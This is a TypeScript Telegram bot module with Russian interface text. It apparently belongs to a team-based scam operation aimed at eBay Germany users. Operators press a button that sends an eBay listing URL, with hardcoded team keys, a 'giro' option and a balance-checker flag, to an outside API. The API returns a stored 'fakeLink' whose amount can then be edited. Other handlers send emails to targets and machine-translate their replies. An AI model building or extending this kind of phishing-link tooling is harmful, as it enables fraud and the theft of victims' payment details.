import { Composer, InlineKeyboard } from "grammy";
import type { CustomContext } from "../types";
import { UserRepo, AdvertsRepo, type TeamProvider } from "../db/queries";
import { translateToRussian } from "../utils/openAI";

import { EntitiesParser, RendererHtml } from "@qz/telegram-entities-parser";
import type {
  CommonEntity,
  RendererOutput,
  Message
} from "@qz/telegram-entities-parser/types";

const TEAM_KEY_TSUM = "7bc1926a-a6ca-46f1-811b-15a09c716c8a";
const TEAM_KEY_AQUA = "ece84721-615f-4364-837c-b615f635ecc8";
const API_HOST = "api.goo.network";

function pickTeamKey(team: TeamProvider): string {
  return team === "tsum" ? TEAM_KEY_TSUM : TEAM_KEY_AQUA;
}

/**
 * Генерация ссылки с учётом:
 * - выбранной команды (X-Team-Key по team пользователя)
 * - flags.giroMode -> при true добавляет body.options = { isGiro: true }, иначе options не отправляется
 */
export async function generateLink(
  telegramId: number,
  apiKey: string,
  url: string,
  profileID: string
): Promise<string> {
  // команда пользователя -> нужный X-Team-Key
  const team = await UserRepo.getTeam(telegramId); // "tsum" | "aqua"
  const TEAM_KEY = pickTeamKey(team);

  // флаги пользователя
  const flags = await UserRepo.getFlags(telegramId);

  // формируем body, options только если giroMode === true
  const res = await fetch(`https://${API_HOST}/api/generate/single/parse`, {
    method: "POST",
    headers: {
      Authorization: `Apikey ${apiKey}`,
      Host: API_HOST,
      "X-Team-Key": TEAM_KEY,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      service: "ebay_de",
      url,
      isNeedBalanceChecker: false,
      profileID,
      ...(flags.giroMode ? { options: { isGiro: true } } : {}),
    }),
  });

  if (!res.ok) {
    throw new Error(`HTTP error ${res.status}`);
  }

  const { status, message } = (await res.json()) as {
    status: boolean;
    message: string;
  };

  if (!status) throw new Error("API вернул status=false");
  return message;
}

const composer = new Composer<CustomContext>();

composer.callbackQuery(/^write-message:(\d+)$/, async (ctx) => {
  await ctx.conversation.exitAll();
  const id = ctx.match[1];
  await ctx.answerCallbackQuery();
  await ctx.conversation.enter("sendEmailConv", id);
});

composer.callbackQuery(/^edit-amount:(\d+)$/, async (ctx) => {
  await ctx.conversation.exitAll();
  const advertId = Number(ctx.match[1]);
  await ctx.answerCallbackQuery();

  // Устанавливаем сессию — следующий текст от пользователя будет новой суммой для объявления
  if (ctx.session) {
    ctx.session.step = `await_edit_amount_${advertId}`;
  }

  await ctx.reply("Введите новую сумму для объявления (например: 129.99):");
});

const gen = new Set<number>();

composer.callbackQuery(/^generate-link:(\d+)$/, async (ctx) => {
  await ctx.conversation.exitAll();
  const mailId = Number(ctx.match[1]);
  const { advertId, link } = await AdvertsRepo.getAdvertByMailId(mailId);

  if (!advertId || !link) {
    return ctx.answerCallbackQuery({
      text: "❌ У этого письма нет связанного объявления",
      show_alert: true,
    });
  }

  if (gen.has(advertId)) {
    return ctx.answerCallbackQuery({
      text: "⏳ Ссылка всё ещё создаётся...",
      show_alert: true,
    });
  }
  gen.add(advertId);

  const replyTo = ctx.callbackQuery.message!.message_id;

  const team = await UserRepo.getTeam(ctx.from.id);
  // единственный быстрый ответ на колбэк (закрыть «часики»)
  await ctx.answerCallbackQuery({
    text: `⚙️ ${team.toUpperCase()} Создаём ссылку...`,
  });

  void (async () => {
    try {
      const apiKey = await UserRepo.getApiKey(team, ctx.from.id);
      const profileId = await UserRepo.getProfileId(team, ctx.from.id);

      const fakeLink = await generateLink(ctx.from.id, apiKey, link, profileId);
      await AdvertsRepo.setFakeLink(advertId, fakeLink);

      const text = `🇩🇪 Объявления › eBay 2.0 ⌵

🗂 Профиль (<code>${profileId}</code>) ⌵

🔗 Ссылка: <code>${fakeLink}</code>`;

      const keyboard = new InlineKeyboard().text("изменить сумму", `edit-amount:${advertId}`);

      await ctx.reply(text, {
        parse_mode: "HTML",
        reply_parameters: {
          message_id: replyTo,
          allow_sending_without_reply: true,
        },
        link_preview_options: { is_disabled: true },
        reply_markup: keyboard,
      });
    } catch (e: any) {
      await ctx.reply(
        `❌ ${team.toUpperCase()} Ошибка: ${e?.message ?? "при генерации ссылки"}`
      );
    } finally {
      gen.delete(advertId);
    }
  })();
});

/////////////////////////////////////////
class MyRenderer extends RendererHtml {
  override expandableBlockquote(
    options: { text: string; entity: CommonEntity },
  ): RendererOutput {
    return {
      prefix: '<blockquote expandable>',
      suffix: "</blockquote>",
    };
  }
}

const entitiesParser = new EntitiesParser({ renderer: new MyRenderer() });
export const parse = (message: Message) => entitiesParser.parse({ message });

const translating = new Set<number>();

composer.callbackQuery(/^translate-message:(\d+)$/, async (ctx) => {
  await ctx.conversation.exitAll();
  const msg = ctx.callbackQuery.message!;
  const mailId = Number(ctx.match[1]);
  const text = await AdvertsRepo.getTextByMailId(mailId);
  if (!text) {
    return ctx.answerCallbackQuery({
      text: "❌ Текст для перевода не найден",
      show_alert: true,
    });
  }

  if (translating.has(mailId)) {
    return ctx.answerCallbackQuery({
      text: "⏳ Перевод всё ещё выполняется...",
      show_alert: true,
    });
  }
  translating.add(mailId);

  const baseHtml = parse(msg);

  // добавить "начинаю перевод"
  const workingHtml = `${baseHtml}\n\n⏳ <i>Начинаю перевод...</i>`;
  await ctx.editMessageText(workingHtml, {
    parse_mode: "HTML",
    reply_markup: msg.reply_markup,
  });

  await ctx.answerCallbackQuery("🔤 Перевожу...");

  // асинхронный перевод
  void (async () => {
    try {
      const translated = await translateToRussian(text);

      // Экранируем HTML entities в переведенном тексте
      const escapedTranslated = translated
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');

      // допустим, здесь идёт перевод
      const doneHtml = `${baseHtml}\n\n<b>Перевод:</b>\n<blockquote expandable><code>${escapedTranslated}</code></blockquote>`;

      // убираем кнопку перевода
      const kb = msg.reply_markup?.inline_keyboard ?? [];
      kb.shift();

      await ctx.editMessageText(doneHtml, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: kb },
      });
    } catch (e: any) {
      // удалить последнюю строку (начинаю перевод...)
      const failedHtml = workingHtml.replace(/\n\n⏳.*$/s, "");
      await ctx.editMessageText(failedHtml, {
        parse_mode: "HTML",
        reply_markup: msg.reply_markup,
      });

      await ctx.reply(
        `❌ Ошибка перевода: ${e?.message ?? "неизвестная ошибка"}`,
        {
          reply_parameters: {
            message_id: msg.message_id,
            allow_sending_without_reply: true,
          },
        }
      );
    } finally {
      translating.delete(mailId);
    }
  })();
});

export default composer;
